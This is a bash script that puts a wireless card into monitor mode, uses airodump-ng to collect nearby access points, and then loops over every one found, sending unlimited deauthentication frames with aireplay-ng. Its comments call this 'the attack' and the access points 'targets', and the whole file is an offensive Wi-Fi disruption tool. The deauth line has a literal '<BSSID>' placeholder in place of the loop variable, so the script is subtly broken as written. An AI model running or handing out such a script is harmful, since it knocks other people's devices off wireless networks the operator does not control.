#!/usr/bin/env bash
# Usage: sudo ./script.sh <interface> <airodump_seconds> <outdir>
# Example: sudo ./script.sh wlan1 20 ./out

set -euo pipefail

IFACE="${1:-wlan1}"
DUR="${2:-20}"
OUTDIR="${3:-./airodump_out}"
PREFIX="scan"

mkdir -p "$OUTDIR"

echo "[*] Interface: $IFACE"
echo "[*] Duration: ${DUR}s"
echo "[*] Output dir: $OUTDIR"

# Step 1: bring interface down -> monitor -> up 
echo "[*] setting interface to monitor mode..."
sudo ifconfig "$IFACE" down || true
# Note: some distros use airmon-ng to set monitor mode; i used iwconfig and airmon-ng.
# We'll attempt both safe methods:
if command -v airmon-ng >/dev/null 2>&1; then
  sudo airmon-ng check kill >/dev/null 2>&1 || true
  # do not auto-create wlan1mon; we keep same name
fi
sudo iwconfig "$IFACE" mode monitor 2>/dev/null || true
sudo ifconfig "$IFACE" up || true
sleep 1

# Step 2: run airodump-ng to collect CSV so we can use them in the attack
CAP_PREFIX="$OUTDIR/${PREFIX}"
CSV_FILE="${CAP_PREFIX}-01.csv"   # airodump-ng writes PREFIX-01.csv

echo "[*] running airodump-ng for $DUR seconds (writing to $CAP_PREFIX-*)"
# run in background for given duration; timeout to ensure it stops
sudo timeout "$DUR" airodump-ng --write "$CAP_PREFIX" --output-format csv "$IFACE" >/dev/null 2>&1 || true

if [ ! -f "$CSV_FILE" ]; then
  echo "ERROR: expected CSV not found at $CSV_FILE"
  ls -l "$OUTDIR"
  exit 1
fi

echo "[*] parsing CSV: $CSV_FILE"

# Extract AP BSSIDs (BSSID is first field of AP lines). airodump CSV has AP lines first.
# We find lines starting with MAC address pattern before the "Station MAC" header, and for that i used regex.
AP_LIST=$(awk -F',' '
  BEGIN { mac_re="^[0-9A-Fa-f:]{17}$" }
  $1 ~ mac_re && $0 !~ /Station MAC/ { gsub(/^[ \t]+|[ \t]+$/,"",$1); print $1 }
' "$CSV_FILE" | sort -u)

if [ -z "$AP_LIST" ]; then
  echo "[!] no APs found in CSV (or parsing failed)."
  exit 0
fi

echo
echo "=== Targets found (`echo "$AP_LIST" | wc -l` APs) ==="
echo "$AP_LIST"
echo

LOGFILE="$OUTDIR/log.log"
echo "[*] Logging activity to $LOGFILE"
echo "loop run at $(date)" >> "$LOGFILE"

# Loop over BSSIDs and do the action
for bssid in $AP_LIST; do
  echo "Would target BSSID: $bssid"
  echo "$(date +'%F %T') | BSSID=$bssid" >> "$LOGFILE"
  # this is the deauth command:
  aireplay-ng --deauth 0 -a <BSSID> "$IFACE"

  # small sleep so loop is visible and not too aggressive
  sleep 0.5
done

echo
echo "[*]  complete. Check $LOGFILE for details."
